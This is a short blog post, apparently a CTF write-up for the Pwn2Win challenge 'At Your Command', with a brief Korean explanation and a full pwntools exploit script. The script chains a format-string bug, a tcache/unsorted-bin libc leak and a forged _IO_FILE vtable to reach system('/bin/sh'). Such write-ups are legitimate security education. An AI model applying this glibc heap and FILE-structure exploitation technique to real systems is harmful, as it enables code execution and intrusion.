---
title: "At Your Command"
date: 2020-6-6
ctf: Pwn2Win CTF
layout: post
---

* glibc 2.27 tcache

* _IO_FILE vtable check bypass

fake 구조체 만들고 fsb로 아다리 잘 맞춰주고 fp->system("/bin/sh"); 만들어주면 된다.

> solve.py

```python
from pwn import *
from ctypes import *

# context.log_level = 'debug'
e = ELF('./command')
p = process('./command',aslr=True)
lib = CDLL('libc.so.6')
libc = e.libc
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)
buf = 0x0000000000202060
filename = 0x0000000000202080

def menu(num):
	sla('>',str(num))

def include(priority,data):
	menu(1)
	sla(':',str(priority))
	sa(':',data)

def review(idx):
	menu(2)
	sla(':',str(idx))

def delete(idx):
	menu(3)
	sla(':',str(idx))

def lists():
	menu(4)

def send():
	menu(5)

p.sendafter(':',"%{}c%4$hn".format(0x1260)) # name

# tcache bin -> 7 -> unsorted bin attack
for i in range(8):
	include(1,'A')

for i in range(1,8):
	delete(i)

delete(0)

for i in range(7):
	include(1,'B')

include(1,'!')
review(7)
p.recvuntil('!')
leak = u64('\x21'+p.recv(5)+'\x00\x00')
libc_base = leak - 0x3ebc21
log.info('libc_base : {}'.format(hex(libc_base)))
io_file_jumps = libc_base + libc.symbols['_IO_file_jumps']
log.info('io_file_jumps : {}'.format(hex(io_file_jumps)))
io_str_overflow = io_file_jumps + 0xd8
log.info('io_str_overflow : {}'.format(hex(io_str_overflow)))
fake_vtable = io_str_overflow - 16
log.info('fake_vtable : {}'.format(hex(fake_vtable)))
system = libc_base + libc.symbols['system']
log.info('system : {}'.format(hex(system)))
binsh = libc_base + libc.search('/bin/sh\x00').next()
log.info('binsh : {}'.format(hex(binsh)))

# payload = p64(0xfbad2400) # flags
payload = p64(0x0) # _IO_read_ptr
payload += p64(0x0) # _IO_read_end
payload += p64(0x0) # _IO_read_base
payload += p64(0x0) # _IO_write_base
payload += p64( ( (binsh - 100) / 2 )) # _IO_write_ptr
payload += p64(0x0) # _IO_write_end
payload += p64(0x0) # _IO_buf_base
payload += p64( ( (binsh - 100) / 2 )) # _IO_buf_end
payload += p64(0x0) # _IO_save_base
payload += p64(0x0) # _IO_backup_base
payload += p64(0x0) # _IO_save_end
payload += p64(0x0) # _IO_marker
payload += p64(0x0) # _IO_chain
payload += p64(0x0) # _fileno
payload += p64(0x0) # _old_offset
payload += p64(0x0)
payload += p64(libc_base + 0x3eb1b0) # _lock 
payload += p64(0x0)*9
payload += p64(fake_vtable) # io_file_jump overwrite 
payload += p64(system) # fp->_s._allocate_buffer RIP

delete(7)
include(0xfbad1800,payload)
send()

p.sendlineafter('Are you sending the commands to which rbs?','1')

# (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
p.interactive()
```
